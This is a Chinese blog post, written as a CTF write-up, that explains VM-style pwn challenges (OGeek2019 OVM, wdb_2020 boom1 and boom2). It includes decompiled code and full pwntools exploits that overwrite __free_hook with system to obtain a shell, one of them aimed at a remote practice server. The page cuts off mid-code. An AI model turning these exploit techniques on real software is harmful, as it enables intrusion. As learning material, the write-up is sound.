<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CharonPt的Blog">
<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/index.html">
<meta property="og:site_name" content="CharonPt的Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CharonPt的Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CharonPt的Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/29/VMpwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/29/VMpwn/" class="post-title-link" itemprop="url">VMpwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-29 11:47:39" itemprop="dateCreated datePublished" datetime="2022-08-29T11:47:39+08:00">2022-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-09-01 22:03:02" itemprop="dateModified" datetime="2022-09-01T22:03:02+08:00">2022-09-01</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>被今年国赛的VM题目干傻了，痛定思痛，决定刷一段时间VMpwn</p>
<h2 id="简述VMpwn"><a href="#简述VMpwn" class="headerlink" title="简述VMpwn"></a>简述VMpwn</h2><p>VM指的其实就是虚拟机，出题人会在题目中设计一部分代码用来模拟一台PC的运行，那么既然要模拟一台PC的运行，就免不了要涉及几个部分：①分配空间模拟代码段。② 分配空间模拟栈段。③分配空间模拟寄存器。④分配空间模拟数据段</p>
<p>这类VMpwn会接受一段我们输入的数据，并且把我们输入的数据按照它的规则解析成用来运行其伪汇编指令的代码，这种我们输入的数据被称为opcode（运行代码）</p>
<p>以一道题目举个例子</p>
<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>其程序主体如下：</p>


<p>这题的逻辑很简单且清晰，其在程序的数据段保存<code>memory</code>、<code>reg</code>、<code>stack</code>三个数组，分别用来保存我们输入的数据（用来解析成指令）、保存寄存器以及用作栈空间，在后面的一段for循环中其读入输入数据并保存在<code>memory</code>中，然后进入while循环进行运行。运行完opcode之后可以往comment[0]处输入最多0x8C的数据，然后程序会在<code>sendcomment</code>中将<code>comment[0]</code>给free掉</p>
<p>执行指令的函数部分如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">execute</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 L; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 M; <span class="comment">// [rsp+19h] [rbp-7h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 H; <span class="comment">// [rsp+1Ah] [rbp-6h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  H = (code &amp; <span class="number">0xF0000</span>u) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  M = (code &amp; <span class="number">0xF00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">  L = code &amp; <span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(code) == <span class="number">0x70</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    reg[H] = reg[L] + reg[M];</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(code) &gt; <span class="number">0x70</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( HIBYTE(code) == <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[H] = reg[L] ^ reg[M];</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( HIBYTE(code) &gt; <span class="number">0xB0</span>u )</span><br></pre></td></tr></table></figure>

<p>从改函数的前几行就能了解该程序执行opcode的逻辑，其将我们一次输入的四个字节的opcode按一字节拆分成四部分，最高字节用来确定执行哪条伪汇编指令，其余三字节用来确定对应的寄存器，这个过程其实就像真实计算机读取机器码然后将其转变成汇编代码的过程</p>
<p>一般做题时最重要的就是搞清楚这个题目opcode的运行逻辑，然后去逆向出其能执行什么伪汇编指令，这时就大概能确定题目的思路了。</p>
<p>对于此题来说，分析出来的伪汇编指令集如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x10: reg[H] = code</span><br><span class="line">0x20: reg[H] = code = 0</span><br><span class="line">0x30: reg[H] = memory[reg[L]]</span><br><span class="line">0x40: memory[reg[L]] = reg[H]</span><br><span class="line">0x50: push reg[H]</span><br><span class="line">0x60: pop</span><br><span class="line">0x70: (add)  reg[H] = reg[L] + reg[M]</span><br><span class="line">0x80: (sub)  reg[H] = reg[M] - reg[L]</span><br><span class="line">0x90: (and)  reg[H] = reg[L] &amp; reg[M]</span><br><span class="line">0xA0: (or)   reg[H] = reg[L] | reg[M]</span><br><span class="line">0xB0: (xor)  reg[H] = reg[L] ^ reg[M]</span><br><span class="line">0xC0: (left) reg[H] = reg[M] &lt;&lt; reg[L]</span><br><span class="line">0xD0: (right)reg[H] = reg[M] &gt;&gt; reg[L]</span><br><span class="line">0xE0: printf reg =&gt; end execute</span><br></pre></td></tr></table></figure>

<p>这题的漏洞在于0x30跟0x40操作数对应的指令中没有对memory[]的下标进行检查，导致可以控制reg[]来越界写到memory附近的地址。那么很显然就可以将comment[0]给修改成<code>__free_hook - 8</code>，在最后输入的时候输入<code>&#39;/bin/sh\x00&#39;+p64(system)</code>即可。</p>
<p>该题唯一的泄漏点在操作数为0xE0时，其会将所有reg[]中的值输出出来，然后就结束opcode的运行，但是由于该题VM伪指令集中给了add跟sub指令，所以同样可以在不知道libc的情况下将某个libc地址改成<code>__free_hook</code>，具体操作就是将got表中的地址拷贝到reg[]中，然后利用偏移add/sub得到<code>__free_hook</code>，然后将其拷贝到comment[0]中即可，最后利用泄漏点得到system。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./OVM&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code</span>(<span class="params">opcode,H,M,L</span>):</span></span><br><span class="line">	L += M&lt;&lt;<span class="number">8</span></span><br><span class="line">	L += H&lt;&lt;<span class="number">16</span></span><br><span class="line">	L += opcode&lt;&lt;<span class="number">24</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(L))</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(L))</span><br><span class="line">	</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;PC: &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;SP: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;CODE SIZE: &quot;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># comment =&gt; &amp;__free_hook - 8</span></span><br><span class="line"><span class="string"># 1.func@got.plt =&gt; reg[]</span></span><br><span class="line"><span class="string"># reg[5] = memory[reg[0]]</span></span><br><span class="line"><span class="string"># reg[6] = memory[reg[0]]</span></span><br><span class="line"><span class="string"># 2.func@got.plt =&gt; comment</span></span><br><span class="line"><span class="string"># reg[1] = offset</span></span><br><span class="line"><span class="string"># reg[5] = reg[5] + offset</span></span><br><span class="line"><span class="string"># memory[reg[0]] = reg[5]</span></span><br><span class="line"><span class="string"># memory[reg[0]] = reg[6]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#memory = 0x2060</span></span><br><span class="line"><span class="string">#got = 0x1FF8</span></span><br><span class="line"><span class="string">#memory[-26] = got</span></span><br><span class="line"><span class="string">#comment = 0x2040</span></span><br><span class="line"><span class="string">#memory[-5] = comment</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">reg[0] = 0</span></span><br><span class="line"><span class="string">reg[1] = 26</span></span><br><span class="line"><span class="string">reg[0] = reg[0] - reg[1]</span></span><br><span class="line"><span class="string">reg[5] = memory[reg[0]]</span></span><br><span class="line"><span class="string">reg[1] = 1</span></span><br><span class="line"><span class="string">reg[0] = reg[0] + reg[1]</span></span><br><span class="line"><span class="string">reg[6] = memory[reg[0]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#stderr = 0x00007f104f614700</span></span><br><span class="line"><span class="string">#free_hook-8 = 0x7f104f6157a0</span></span><br><span class="line"><span class="string">#offset = 0x10a8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">26</span>)</span><br><span class="line">code(<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x30</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x30</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">code(<span class="number">0xc0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0xa0</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">code(<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x40</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0xE0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;R5: &quot;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;R6: &quot;</span>)</span><br><span class="line">b = <span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = (b &lt;&lt; <span class="number">32</span>)+a - (<span class="number">0x7f75a04f07a0</span> - <span class="number">0x7f75a012a000</span>)</span><br><span class="line">system = libc_base + (<span class="number">0x7f75a016f3a0</span> - <span class="number">0x7f75a012a000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;HOW DO YOU FEEL AT OVM?&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="wdb-2020-1st-boom1"><a href="#wdb-2020-1st-boom1" class="headerlink" title="wdb_2020_1st_boom1"></a>wdb_2020_1st_boom1</h2><p>原本以为是道普通的VM，但是审着审着发现逻辑似乎有点过于复杂了，查看了一些大佬的WP后知道了这题实现的是一个C编译器，这也引出一个思路就是比如看到程序中有一些比较特别的关键字时就可以往这个方向去猜测这个程序的功能</p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom1-1.jpg" class>

<p>很明显这些是C的一些保留关键字，同时搜索字符串可以找到这种</p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom1-2.jpg" class>

<p>这时可以要是不了解的可以试着去百度或者github搜一下，可能就会有所发现</p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom1-3.jpg" class>

<p>这样的话就可以大概确定这题所实现的一个功能了</p>
<p>至此说的这些其实跟技术也不挂钩，只是一个做题时的思路</p>
<p>回到题目，从main函数的后半段可以大概知道有一些函数的能被调用的，同时有一个计数，当一个函数被调用过之后该计数-1，然后就不能再调用任何函数了。</p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom1-4.jpg" class>

<p>然后随便验证一下就能知道题目大概的功能和限制（只能使用部分C关键字，只能调用部分函数），而这其中包含了printf和free，利用printf去测远程服务器版本，再用赋值语句改写free_hook就行了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./wdb_2020_1st_boom1&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29901</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	int a;</span></span><br><span class="line"><span class="string">	*(&amp;a-0x1646f0/8) = &amp;a-0x502b98/8;</span></span><br><span class="line"><span class="string">	free(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">	return 0;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b printf&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;living...\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="wdb-2020-1st-boom2"><a href="#wdb-2020-1st-boom2" class="headerlink" title="wdb_2020_1st_boom2"></a>wdb_2020_1st_boom2</h2><p>正经VM题，花了两个半天去复现，然后不知道为啥本地通了buu没通</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>函数太长了只能复制着贴了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 code; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v6; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 **v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v10; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v13; <span class="comment">// 